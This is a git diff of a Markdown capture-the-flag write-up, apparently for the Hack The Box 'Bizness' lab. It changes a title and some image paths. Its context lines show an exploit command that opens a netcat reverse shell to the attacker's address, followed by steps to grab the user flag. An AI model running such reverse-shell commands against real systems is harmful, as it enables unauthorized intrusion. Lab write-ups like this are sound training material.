@@ -5,7 +5,7 @@ cover: >-
 coverY: 0
 ---
 
-# 👩‍💼 Bizness
+# 👩‍💼 Bizness (10.10.11.252)
 
 ## Scanning
 
@@ -107,7 +107,7 @@ python3 exploit.py --url https://bizness.htb/ --cmd 'nc -c bash 10.10.14.19 7777
 # -c = specifies shell commands to execute after a connection. In this case, we're specifying we want to use bash
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>Exploit Successful</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>Exploit Successful</p></figcaption></figure>
 
 
 
@@ -115,7 +115,7 @@ python3 exploit.py --url https://bizness.htb/ --cmd 'nc -c bash 10.10.14.19 7777
 
 From there, we just need to grab the user flag in the "_ofbiz_" home directory:
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>User flag</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption><p>User flag</p></figcaption></figure>
 
 Now, before we do anything else, let's get a full TTY Shell. The best way to do this is using this Python script:
 
